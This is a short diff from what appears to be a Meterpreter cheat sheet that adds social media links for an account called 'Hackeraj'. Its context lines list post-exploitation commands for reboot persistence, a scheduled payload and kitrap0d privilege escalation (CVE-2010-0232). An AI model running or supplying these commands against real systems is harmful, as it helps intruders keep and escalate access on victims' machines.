@@ -135,4 +135,7 @@ run persistence         survices a reboot (without admin or system)
 run schedulme -e file.exe -m 30 you'll need to man load the meterpreter.exe payload
 run kitrap0d            allows priv escalation using CVE-2010-0232
 ```
-
+[Facebook](https://www.facebook.com/Hackeraj/)
+[Twitter](https://twitter.com/Hackeraj_np/)
+[Instagram](https://www.instagram.com/hackeraj/)
+[Youtube](https://www.youtube.com/Hackeraj/)
